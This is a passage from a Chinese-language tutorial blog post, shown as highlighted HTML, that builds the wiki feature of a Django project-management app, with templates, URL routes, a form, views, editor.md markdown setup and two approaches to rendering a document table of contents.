class="attr">class</span>=<span class="string">"fa fa-trash-o"</span> <span class="attr">aria-hidden</span>=<span class="string">"true"</span>&gt;</span><span class="tag">&lt;/<span class="name">i</span>&gt;</span> 删除</span><br><span class="line">                        <span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line">                    &#123;% endif %&#125;</span><br><span class="line">                <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"panel-body"</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"col-sm-3 title-list"</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">ul</span> <span class="attr">id</span>=<span class="string">"catalog"</span>&gt;</span></span><br><span class="line">                        </span><br><span class="line">                        <span class="comment">&lt;!--</span></span><br><span class="line"><span class="comment">                        &lt;li&gt;&lt;a href="#"&gt;目录1&lt;/a&gt;</span></span><br><span class="line"><span class="comment">                            &lt;ul&gt;</span></span><br><span class="line"><span class="comment">                                &lt;li&gt;&lt;a href="#"&gt;子目录1&lt;/a&gt;&lt;/li&gt;</span></span><br><span class="line"><span class="comment">                                &lt;li&gt;&lt;a href="#"&gt;子目录2&lt;/a&gt;&lt;/li&gt;</span></span><br><span class="line"><span class="comment">                            &lt;/ul&gt;</span></span><br><span class="line"><span class="comment">                        &lt;/li&gt;</span></span><br><span class="line"><span class="comment">                        &lt;li&gt;&lt;a href="#"&gt;目录2&lt;/a&gt;&lt;/li&gt;</span></span><br><span class="line"><span class="comment">                        &lt;li&gt;&lt;a href="#"&gt;目录3&lt;/a&gt;&lt;/li&gt;</span></span><br><span class="line"><span class="comment">                        --&gt;</span></span><br><span class="line">                        </span><br><span class="line">                    <span class="tag">&lt;/<span class="name">ul</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"col-sm-9 content"</span>&gt;</span></span><br><span class="line">                    &#123;% if wiki_obj %&#125;</span><br><span class="line">                        <span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">"previewMarkdown"</span>&gt;</span></span><br><span class="line">                            <span class="tag">&lt;<span class="name">textarea</span>&gt;</span>&#123;&#123; wiki_obj.content &#125;&#125;<span class="tag">&lt;/<span class="name">textarea</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">                    &#123;% else %&#125;</span><br><span class="line">                        <span class="tag">&lt;<span class="name">div</span> <span class="attr">style</span>=<span class="string">"text-align: center ;margin-top: 80px"</span>&gt;</span></span><br><span class="line">                            <span class="tag">&lt;<span class="name">h4</span>&gt;</span>《&#123;&#123; request.tracer.project.name &#125;&#125;》wiki文档<span class="tag">&lt;/<span class="name">h4</span>&gt;</span></span><br><span class="line">                            <span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"&#123;% url 'wiki_add' project_id=request.tracer.project.id %&#125;"</span>&gt;</span></span><br><span class="line">                                <span class="tag">&lt;<span class="name">i</span> <span class="attr">class</span>=<span class="string">"fa fa-plus-circle"</span> <span class="attr">aria-hidden</span>=<span class="string">"true"</span>&gt;</span><span class="tag">&lt;/<span class="name">i</span>&gt;</span></span><br><span class="line">                                新建文档</span><br><span class="line">                            <span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">                    &#123;% endif %&#125;</span><br><span class="line"></span><br><span class="line">                <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">&#123;% endblock %&#125;</span><br><span class="line"></span><br><span class="line">&#123;% block js %&#125;</span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="actionscript">        <span class="comment">// 目录初始化</span></span></span><br><span class="line"><span class="actionscript">        <span class="comment">// markdown的相关配置</span></span></span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">&#123;% endblock %&#125;</span><br></pre></td></tr></table></figure><p>wiki首页展示的视图函数</p><p>在views目录下常见wiki.py文件，存放wiki函数代码</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> django.shortcuts <span class="keyword">import</span> render, reverse, redirect</span><br><span class="line"><span class="keyword">from</span> django.http <span class="keyword">import</span> JsonResponse</span><br><span class="line"><span class="keyword">from</span> django.views.decorators.csrf <span class="keyword">import</span> csrf_exempt</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> web.forms.wiki <span class="keyword">import</span> WikiModelForm</span><br><span class="line"><span class="keyword">from</span> utils.encrypt <span class="keyword">import</span> uid</span><br><span class="line"><span class="keyword">from</span> utils.tencent <span class="keyword">import</span> cos</span><br><span class="line"><span class="keyword">from</span> web <span class="keyword">import</span> models</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">wiki</span><span class="params">(request, project_id)</span>:</span></span><br><span class="line">    <span class="string">"""wiki首页展示"""</span></span><br><span class="line">    wiki_id = request.GET.get(<span class="string">'wiki_id'</span>)</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> wiki_id <span class="keyword">or</span> <span class="keyword">not</span> wiki_id.isdecimal():  <span class="comment"># isdecimal判断wiki_id是否是十进制的数</span></span><br><span class="line">        <span class="keyword">return</span> render(request, <span class="string">'manage/wiki.html'</span>)</span><br><span class="line">    wiki_obj = models.Wiki.objects.filter(id=wiki_id, project_id=project_id).first()</span><br><span class="line">    <span class="keyword">return</span> render(request, <span class="string">'manage/wiki.html'</span>, &#123;<span class="string">'wiki_obj'</span>: wiki_obj&#125;)</span><br></pre></td></tr></table></figure><h3 id="10-4-新建文档"><a href="#10-4-新建文档" class="headerlink" title="10.4 新建文档"></a>10.4 新建文档</h3><h4 id="10-4-1构造url路径"><a href="#10-4-1构造url路径" class="headerlink" title="10.4.1构造url路径"></a>10.4.1构造url路径</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 项目管理</span></span><br><span class="line">url(<span class="string">r'^manage/(?P&lt;project_id&gt;\d+)/'</span>, include([</span><br><span class="line">    <span class="comment"># wiki路径</span></span><br><span class="line">    url(<span class="string">r'^wiki/$'</span>, wiki.wiki, name=<span class="string">'wiki'</span>),</span><br><span class="line">    <span class="comment"># 新建</span></span><br><span class="line">    url(<span class="string">r'^wiki/add/$'</span>, wiki.wiki_add, name=<span class="string">'wiki_add'</span>),</span><br><span class="line">], <span class="literal">None</span>, <span class="literal">None</span>)),</span><br></pre></td></tr></table></figure><h4 id="10-4-2构造form表单"><a href="#10-4-2构造form表单" class="headerlink" title="10.4.2构造form表单"></a>10.4.2构造form表单</h4><p>在forms文件夹下兴建wiki.py文件用于存放wiki的form表单</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> django <span class="keyword">import</span> forms</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> web <span class="keyword">import</span> models</span><br><span class="line"><span class="keyword">from</span> web.forms.bootstrap <span class="keyword">import</span> BootSrtapForm</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">WikiModelForm</span><span class="params">(BootSrtapForm,forms.ModelForm)</span>:</span></span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Meta</span>:</span></span><br><span class="line">        model = models.Wiki</span><br><span class="line">        exclude = [<span class="string">'project'</span>,<span class="string">'depth'</span>,]</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self,request,*args,**kwargs)</span>:</span></span><br><span class="line">        super().__init__(*args,**kwargs)</span><br><span class="line">        <span class="comment"># 找到想要的字段把显示的数据重置</span></span><br><span class="line">        <span class="comment"># 数据 = 数据库中获取</span></span><br><span class="line">        total_data_list = [(<span class="string">""</span>,<span class="string">"请选择父文章"</span>),]</span><br><span class="line">        data_list = models.Wiki.objects.filter(project=request.tracer.project).values_list(<span class="string">'id'</span>,<span class="string">'title'</span>)</span><br><span class="line">        total_data_list.extend(data_list)</span><br><span class="line">        self.fields[<span class="string">'parent'</span>].choices = total_data_list</span><br></pre></td></tr></table></figure><h4 id="10-4-3-wiki添加文章的视图函数"><a href="#10-4-3-wiki添加文章的视图函数" class="headerlink" title="10.4.3 wiki添加文章的视图函数"></a>10.4.3 wiki添加文章的视图函数</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">wiki_add</span><span class="params">(request, project_id)</span>:</span></span><br><span class="line">    <span class="string">"""wiki添加文章"""</span></span><br><span class="line">    <span class="keyword">if</span> request.method == <span class="string">'GET'</span>:</span><br><span class="line">        form = WikiModelForm(request)</span><br><span class="line">        <span class="keyword">return</span> render(request, <span class="string">'manage/wiki_form.html'</span>, &#123;<span class="string">'form'</span>: form&#125;)</span><br><span class="line">    form = WikiModelForm(request, data=request.POST)</span><br><span class="line">    <span class="keyword">if</span> form.is_valid():</span><br><span class="line">        <span class="comment"># 判断深度，是否选择父文章</span></span><br><span class="line">        <span class="keyword">if</span> form.instance.parent:</span><br><span class="line">            form.instance.depth = form.instance.parent.depth + <span class="number">1</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            form.instance.depth = <span class="number">1</span></span><br><span class="line">        form.instance.project = request.tracer.project</span><br><span class="line">        form.save()</span><br><span class="line">        url = reverse(<span class="string">'wiki'</span>, kwargs=&#123;<span class="string">'project_id'</span>: project_id&#125;)</span><br><span class="line">        <span class="keyword">return</span> redirect(url)</span><br><span class="line">    <span class="keyword">return</span> render(request, <span class="string">'manage/wiki_form.html'</span>, &#123;<span class="string">'form'</span>: form&#125;)</span><br></pre></td></tr></table></figure><h4 id="10-4-4wiki添加文章的显示页面"><a href="#10-4-4wiki添加文章的显示页面" class="headerlink" title="10.4.4wiki添加文章的显示页面"></a>10.4.4wiki添加文章的显示页面</h4><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br></pre></td><td class="code"><pre><span class="line">&#123;% extends 'layout/manage.html' %&#125;</span><br><span class="line">&#123;% load static %&#125;</span><br><span class="line">&#123;% block css %&#125;</span><br><span class="line"><span class="comment">&lt;!-- 引入markdowm的css --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">link</span> <span class="attr">rel</span>=<span class="string">"stylesheet"</span> <span class="attr">href</span>=<span class="string">"&#123;% static 'plugin/editor-md/css/editormd.min.css' %&#125;"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">style</span>&gt;</span></span><br><span class="line"><span class="css">        <span class="selector-class">.panel-default</span> &#123;</span></span><br><span class="line">            margin-top: 10px;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line"><span class="css">        <span class="selector-class">.panel-default</span> <span class="selector-class">.panel-heading</span> &#123;</span></span><br><span class="line">            display: flex;</span><br><span class="line">            flex-direction: row;</span><br><span class="line">            justify-content: space-between;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line"><span class="css">        <span class="selector-class">.panel-body</span> &#123;</span></span><br><span class="line">            padding: 0;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line"><span class="css">        <span class="selector-class">.title-list</span> &#123;</span></span><br><span class="line"><span class="css">            <span class="selector-tag">border-right</span>: 1<span class="selector-tag">px</span> <span class="selector-tag">solid</span> <span class="selector-id">#dddddd</span>;</span></span><br><span class="line">        &#123;# 右边框 1px 实体 灰色 #&#125; min-height: 500px;</span><br><span class="line">        &#123;# 最小高度500px #&#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line"><span class="css">        <span class="selector-class">.title-list</span> <span class="selector-tag">ul</span> &#123;</span></span><br><span class="line">            padding-left: 15px;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line"><span class="css">        <span class="selector-class">.title-list</span> <span class="selector-tag">ul</span> <span class="selector-tag">a</span> &#123;</span></span><br><span class="line">            display: block;</span><br><span class="line">            padding: 5px 0;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line"><span class="css">        <span class="selector-class">.content</span> &#123;</span></span><br><span class="line"><span class="css">            <span class="selector-tag">border-left</span>: 1<span class="selector-tag">px</span> <span class="selector-tag">solid</span> <span class="selector-id">#dddddd</span>;</span></span><br><span class="line">            min-height: 600px;</span><br><span class="line">            margin-left: -1px;</span><br><span class="line">        &#123;# 左边外边距移动1px #&#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        .editormd-fullscreen&#123;   &#123;# mardown全屏的样式 #&#125;</span><br><span class="line">            z-index: 1001;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br><span class="line">&#123;% endblock %&#125;</span><br><span class="line"></span><br><span class="line">&#123;% block content %&#125;</span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"container-fluid"</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"panel panel-default"</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"panel-heading"</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">div</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">i</span> <span class="attr">class</span>=<span class="string">"fa fa-book"</span> <span class="attr">aria-hidden</span>=<span class="string">"true"</span>&gt;</span><span class="tag">&lt;/<span class="name">i</span>&gt;</span> wiki文档</span><br><span class="line">                <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">div</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"&#123;% url 'wiki_add' project_id=request.tracer.project.id %&#125;"</span> <span class="attr">type</span>=<span class="string">"button"</span></span></span><br><span class="line"><span class="tag">                       <span class="attr">class</span>=<span class="string">"btn btn-success btn-xs"</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">i</span> <span class="attr">class</span>=<span class="string">"fa fa-plus-circle"</span> <span class="attr">aria-hidden</span>=<span class="string">"true"</span>&gt;</span><span class="tag">&lt;/<span class="name">i</span>&gt;</span> 新建</span><br><span class="line">                    <span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"panel-body"</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"col-sm-3 title-list"</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">ul</span> <span class="attr">id</span>=<span class="string">"catalog"</span>&gt;</span></span><br><span class="line"></span><br><span class="line">                    <span class="tag">&lt;/<span class="name">ul</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"col-sm-9 content"</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">form</span> <span class="attr">method</span>=<span class="string">"post"</span> <span class="attr">novalidate</span>&gt;</span></span><br><span class="line">                        &#123;% csrf_token %&#125;</span><br><span class="line">                        &#123;% for field in form %&#125;</span><br><span class="line">                            &#123;% if field.name == 'content' %&#125;</span><br><span class="line">                                <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"form-group"</span>&gt;</span></span><br><span class="line">                                    <span class="tag">&lt;<span class="name">label</span> <span class="attr">for</span>=<span class="string">"&#123;&#123; field.id_for_label &#125;&#125;"</span>&gt;</span>&#123;&#123; field.label &#125;&#125;<span class="tag">&lt;/<span class="name">label</span>&gt;</span></span><br><span class="line">                                    <span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">"editor"</span>&gt;</span></span><br><span class="line">                                        &#123;&#123; field &#125;&#125;</span><br><span class="line">                                    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">                                    <span class="tag">&lt;<span class="name">span</span> <span class="attr">class</span>=<span class="string">"error-msg"</span>&gt;</span>&#123;&#123; field.errors.0 &#125;&#125;<span class="tag">&lt;/<span class="name">span</span>&gt;</span></span><br><span class="line">                                <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">                            &#123;% else %&#125;</span><br><span class="line">                                <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"form-group"</span>&gt;</span></span><br><span class="line">                                    <span class="tag">&lt;<span class="name">label</span> <span class="attr">for</span>=<span class="string">"&#123;&#123; field.id_for_label &#125;&#125;"</span>&gt;</span>&#123;&#123; field.label &#125;&#125;<span class="tag">&lt;/<span class="name">label</span>&gt;</span></span><br><span class="line">                                    &#123;&#123; field &#125;&#125;</span><br><span class="line">                                    <span class="tag">&lt;<span class="name">span</span> <span class="attr">class</span>=<span class="string">"error-msg"</span>&gt;</span>&#123;&#123; field.errors.0 &#125;&#125;<span class="tag">&lt;/<span class="name">span</span>&gt;</span></span><br><span class="line">                                <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">                            &#123;% endif %&#125;</span><br><span class="line">                        &#123;% endfor %&#125;</span><br><span class="line">                        <span class="tag">&lt;<span class="name">button</span> <span class="attr">type</span>=<span class="string">"submit"</span> <span class="attr">class</span>=<span class="string">"btn btn-primary"</span>&gt;</span>提 交<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">&#123;% endblock %&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#123;% block js %&#125;</span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="actionscript">        <span class="comment">// 引入markdowm的js</span></span></span><br><span class="line"><span class="actionscript">        <span class="comment">// 初始化markdowm的相关配置</span></span></span><br><span class="line"><span class="actionscript">        <span class="comment">// 目录初始化</span></span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">&#123;% endblock %&#125;</span><br></pre></td></tr></table></figure><h4 id="10-4-5-应用markdown组件"><a href="#10-4-5-应用markdown组件" class="headerlink" title="10.4.5 应用markdown组件"></a>10.4.5 应用markdown组件</h4><p><strong>常用的文本编辑器：</strong></p><ul><li>富文本编辑器    ckeditor</li><li>markdown编辑器   mdeditor<ul><li>地址：<a href="https://pandao.github.io/editor.md/examples/index.html" target="_blank" rel="noopener">https://pandao.github.io/editor.md/examples/index.html</a></li></ul></li></ul><p><strong>使用markdown编辑器</strong></p><p>markdown编辑器会自动textarea框变成markdown</p><ul><li>在添加页面引入所需的css &amp; js </li></ul><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">link</span> <span class="attr">rel</span>=<span class="string">"stylesheet"</span> <span class="attr">href</span>=<span class="string">"&#123;% static 'plugin/editor-md/css/editormd.min.css' %&#125;"</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">"&#123;% static 'plugin/editor-md/editormd.min.js' %&#125;"</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><ul><li>进行初始化markdown编辑器</li></ul><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="javascript">$(<span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span></span><br><span class="line">            initEditorMd();</span><br><span class="line">        &#125;);</span><br><span class="line">    /*</span><br><span class="line">    初始化markdown编辑器(textare转为编辑器）</span><br><span class="line">    */</span><br><span class="line"><span class="actionscript">    <span class="function"><span class="keyword">function</span> <span class="title">initEditorMd</span><span class="params">()</span> </span>&#123;</span></span><br><span class="line"><span class="actionscript">        editormd(<span class="string">'editor'</span>,&#123;</span></span><br><span class="line"><span class="actionscript">        placeholder:<span class="string">"请输入内容"</span>,</span></span><br><span class="line">        height:500,</span><br><span class="line"><span class="actionscript">        path: <span class="string">"&#123;% static 'plugin/editor-md/lib/' %&#125;"</span></span></span><br><span class="line"><span class="actionscript">        <span class="comment">// 上传图片的相关配置，参考下面上传图片</span></span></span><br><span class="line">        &#125;)</span><br><span class="line">    &#125;</span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><ul><li>为markdown全屏添加样式，防止与导航栏重合</li></ul><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">style</span>&gt;</span></span><br><span class="line">    .editormd-fullscreen&#123;   &#123;# mardown全屏的样式 #&#125;</span><br><span class="line">        z-index: 1001;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br></pre></td></tr></table></figure><h4 id="10-4-6-上传图片"><a href="#10-4-6-上传图片" class="headerlink" title="10.4.6 上传图片"></a>10.4.6 上传图片</h4><p>markdown提供上传图片的按钮，但是目前无法上传本地图片，需相关的配置才行。（参考下面的上传图片）</p><h3 id="10-5-目录显示"><a href="#10-5-目录显示" class="headerlink" title="10.5 目录显示"></a>10.5 目录显示</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">第一种方法：</span><br><span class="line">模板渲染</span><br><span class="line">-数据库中获取的数据要层级划分</span><br><span class="line">    queryset = model.Wiki.object.filter(project_id=<span class="number">2</span>)</span><br><span class="line">    数据构造</span><br><span class="line">    [</span><br><span class="line">        &#123;</span><br><span class="line">            id:<span class="number">1</span>,</span><br><span class="line">            title:<span class="string">'python'</span>,</span><br><span class="line">            children:[</span><br><span class="line">                &#123;</span><br><span class="line">                    id:xxx,</span><br><span class="line">                    name:<span class="string">'xxx'</span></span><br><span class="line">                &#125;</span><br><span class="line">            ]</span><br><span class="line">        &#125;</span><br><span class="line">    ]</span><br><span class="line">    -页面显示，循环显示</span><br><span class="line">    递归</span><br><span class="line">缺点：</span><br><span class="line">- 写代码费劲</span><br><span class="line">    - 效率低</span><br></pre></td></tr></table></figure><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">第二种方法：</span><br><span class="line">后端 + 前端完成ajax + ID选择器</span><br><span class="line"></span><br><span class="line">- 打开页面，发送ajax请求获取多余的文档标题信息</span><br><span class="line">   </span><br><span class="line">    - 后端:获取所有的文章信息</span><br><span class="line">        queryset = model.Wiki.object.filter(project_id=<span class="number">2</span>).values_list(<span class="string">'id'</span>,<span class="string">'title'</span>,<span class="string">'parent_id'</span>)</span><br><span class="line">        [</span><br><span class="line">            &#123;<span class="string">'id'</span>:<span class="number">1</span>,<span class="string">'title'</span>:<span class="string">'python'</span>,parent_id:<span class="literal">None</span>&#125;,</span><br><span class="line">            &#123;<span class="string">'id'</span>:<span class="number">2</span>,<span class="string">'title'</span>:<span class="string">'mysql'</span>,parent_id:<span class="literal">None</span>&#125;,</span><br><span class="line">            &#123;<span class="string">'id'</span>:<span 